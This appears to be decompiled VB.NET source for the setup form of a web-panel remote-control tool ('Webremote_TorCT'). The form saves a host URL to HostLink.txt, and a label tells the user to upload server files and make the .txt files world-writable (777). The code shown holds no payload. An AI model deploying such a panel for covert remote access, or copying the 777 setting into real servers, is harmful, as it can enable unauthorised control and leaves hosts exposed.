Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Webremote_TorCT_5_1.My

Namespace Webremote_TorCT_5_1
    <DesignerGenerated> _
    Public Class SetupClient
        Inherits Form
        ' Methods
        <DebuggerNonUserCode> _
        Public Sub New()
            AddHandler MyBase.Load, New EventHandler(AddressOf Me.SetupClient_Load)
            Dim list As List(Of WeakReference) = SetupClient.__ENCList
            SyncLock list
                SetupClient.__ENCList.Add(New WeakReference(Me))
            End SyncLock
            Me.InitializeComponent
        End Sub

        Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs)
            If Me.TextBox1.Text.Contains("Http") Then
                Interaction.MsgBox("Please use http instead of Http", MsgBoxStyle.ApplicationModal, Nothing)
            ElseIf Me.TextBox1.Text.Contains("http://") Then
                Dim writer As StreamWriter = MyProject.Computer.FileSystem.OpenTextFileWriter((Application.StartupPath & "\HostLink.txt"), False)
                writer.Write(Me.TextBox1.Text)
                writer.Close
                Interaction.MsgBox("Added, Please restart The programm" & ChrW(13) & ChrW(10) & "The Program wil be closed!", MsgBoxStyle.ApplicationModal, Nothing)
                MyProject.Forms.Client.Close
                Me.Close
            Else
                Interaction.MsgBox("Make sure the link contains 'http://'", MsgBoxStyle.ApplicationModal, Nothing)
            End If
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.components Is Nothing)) Then
                    Me.components.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Dim manager As New ComponentResourceManager(GetType(SetupClient))
            Me.Button1 = New Button
            Me.GroupBox1 = New GroupBox
            Me.Label7 = New Label
            Me.Label6 = New Label
            Me.TextBox1 = New TextBox
            Me.GroupBox1.SuspendLayout
            Me.SuspendLayout
            Dim point As New Point(&H79, &HA9)
            Me.Button1.Location = point
            Me.Button1.Name = "Button1"
            Dim size As New Size(&H68, &H17)
            Me.Button1.Size = size
            Me.Button1.TabIndex = 7
            Me.Button1.Text = "Setup Client"
            Me.Button1.UseVisualStyleBackColor = True
            Me.GroupBox1.Controls.Add(Me.Label7)
            point = New Point(&H1B, &H3F)
            Me.GroupBox1.Location = point
            Me.GroupBox1.Name = "GroupBox1"
            size = New Size(&H13B, 100)
            Me.GroupBox1.Size = size
            Me.GroupBox1.TabIndex = 6
            Me.GroupBox1.TabStop = False
            Me.GroupBox1.Text = "Information"
            Me.Label7.AutoSize = True
            point = New Point(12, &H1B)
            Me.Label7.Location = point
            Me.Label7.Name = "Label7"
            size = New Size(&H128, &H34)
            Me.Label7.Size = size
            Me.Label7.TabIndex = 4
            Me.Label7.Text = "Please upload all the files in the map ""UPLOAD"" to your host." & ChrW(13) & ChrW(10) & "Give writable to all the .txt files (777)" & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10) & "Don't use capslock in the ""http://www."" part!"
            Me.Label6.AutoSize = True
            point = New Point(&H33, &H1A)
            Me.Label6.Location = point
            Me.Label6.Name = "Label6"
            size = New Size(&H3E, 13)
            Me.Label6.Size = size
            Me.Label6.TabIndex = 5
            Me.Label6.Text = "Web Link : "
            point = New Point(&H79, &H17)
            Me.TextBox1.Location = point
            Me.TextBox1.Name = "TextBox1"
            size = New Size(&H9C, 20)
            Me.TextBox1.Size = size
            Me.TextBox1.TabIndex = 4
            Me.TextBox1.Text = "http://Example.com"
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            size = New Size(&H17A, &HD6)
            Me.ClientSize = size
            Me.Controls.Add(Me.Button1)
            Me.Controls.Add(Me.GroupBox1)
            Me.Controls.Add(Me.Label6)
            Me.Controls.Add(Me.TextBox1)
            Me.FormBorderStyle = FormBorderStyle.FixedSingle
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.MaximizeBox = False
            Me.MinimizeBox = False
            Me.Name = "SetupClient"
            Me.Text = "SetupClient"
            Me.TopMost = True
            Me.GroupBox1.ResumeLayout(False)
            Me.GroupBox1.PerformLayout
            Me.ResumeLayout(False)
            Me.PerformLayout
        End Sub

        Private Sub SetupClient_Load(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub TextBox1_TextChanged(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.TextBox1.Text = "http://Example.com") Then
                Me.Button1.Enabled = False
            Else
                Me.Button1.Enabled = True
            End If
        End Sub


        ' Properties
        Friend Overridable Property Button1 As Button
            <DebuggerNonUserCode> _
            Get
                Return Me._Button1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button1_Click)
                If (Not Me._Button1 Is Nothing) Then
                    RemoveHandler Me._Button1.Click, handler
                End If
                Me._Button1 = WithEventsValue
                If (Not Me._Button1 Is Nothing) Then
                    AddHandler Me._Button1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property GroupBox1 As GroupBox
            <DebuggerNonUserCode> _
            Get
                Return Me._GroupBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As GroupBox)
                Me._GroupBox1 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Label6 As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._Label6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._Label6 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Label7 As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._Label7
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._Label7 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property TextBox1 As TextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._TextBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As TextBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.TextBox1_TextChanged)
                If (Not Me._TextBox1 Is Nothing) Then
                    RemoveHandler Me._TextBox1.TextChanged, handler
                End If
                Me._TextBox1 = WithEventsValue
                If (Not Me._TextBox1 Is Nothing) Then
                    AddHandler Me._TextBox1.TextChanged, handler
                End If
            End Set
        End Property


        ' Fields
        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
        <AccessedThroughProperty("Button1")> _
        Private _Button1 As Button
        <AccessedThroughProperty("GroupBox1")> _
        Private _GroupBox1 As GroupBox
        <AccessedThroughProperty("Label6")> _
        Private _Label6 As Label
        <AccessedThroughProperty("Label7")> _
        Private _Label7 As Label
        <AccessedThroughProperty("TextBox1")> _
        Private _TextBox1 As TextBox
        Private components As IContainer
    End Class
End Namespace

